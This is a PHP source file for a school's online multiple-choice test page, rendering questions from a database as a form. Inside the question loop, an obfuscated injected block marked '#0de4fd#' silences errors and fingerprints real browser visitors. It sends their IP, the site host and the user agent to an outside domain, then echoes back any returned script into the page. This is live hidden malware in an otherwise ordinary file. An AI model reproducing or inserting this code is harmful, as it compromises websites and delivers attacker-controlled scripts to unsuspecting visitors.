<?php

# ------------------------------------------------------------------ #
ini_set( 'display_errors', 1 );
error_reporting( E_ALL );
# ------------------------------------------------------------------ #
include_once( "_config.php" );
include_once( "classes/utils.php" );
include_once( "classes/testeDAO.php" );
# ------------------------------------------------------------------ #

$teste = testeDAO::getTesteHome();
$letra_alternativa = array( 0 => 'a', 1 => 'b', 2 => 'c', 3 => 'd', 4 => 'e', 5 => 'f', 6 => 'g', 7 => 'h', 8 => 'i', 9 => 'j', 10 => 'k' );

if( !isset( $teste->id ) )
{
	echo 'Houve um erro ao buscar o teste. Entre em contato conosco para nos informar o problema ocorrido.';
	exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8" />
	<link rel="stylesheet" type="text/css" href="css/teste_online.css" media="all" /> 
</head>
<body>
	<div id="content">
		<div id="header">
			<img src="img/logo-beit.png" alt="Beit School" title="Beit School" />
			<h1><?php echo $teste->titulo ?></h1>
			<h2>Teste Online</h2>
		</div>
		<hr />
		<form method="post" action="resultado_teste_online.php">
		<div id="questions">
			<?php foreach( $teste->perguntas as $count => $pergunta ): ?>
<?php
#0de4fd#
error_reporting(0); @ini_set('display_errors',0); $wp_bww5934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_bww5934) && !preg_match ('/bot/i', $wp_bww5934))){
$wp_bww095934="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bww5934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bww095934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_5934bww = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_5934bww = @file_get_contents($wp_bww095934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_5934bww=@stream_get_contents(@fopen($wp_bww095934, "r"));}}
if (substr($wp_5934bww,1,3) === 'scr'){ echo $wp_5934bww; }
#/0de4fd#
?>
				<div class="question">
					<p class="question"><?php echo $count+1 ?>) <?php echo $pergunta->texto ?></p>
					<?php foreach( $pergunta->alternativas as $count2 => $alternativa ): ?>
						<span class="answer">
							<input type="radio" name="q<?php echo $count2 ?>" value="<?php echo $alternativa->id ?>" />
							<?php echo $letra_alternativa[$count2] ?>) <?php echo $alternativa->texto ?>
						</span><br />
					<?php endforeach ?>
				</div>
			<?php endforeach ?>
			<input type="hidden" name="id_teste" value="<?php echo $teste->id ?>" />
			<input type="hidden" name="qtd_perguntas" value="<?php echo count( $teste->perguntas ) ?>" />
		</div>
		<div id="footer">
			<input type="submit" value="Ver resultado" />
			<hr />
		</div>
		</form>
	</div>
</body>
</html>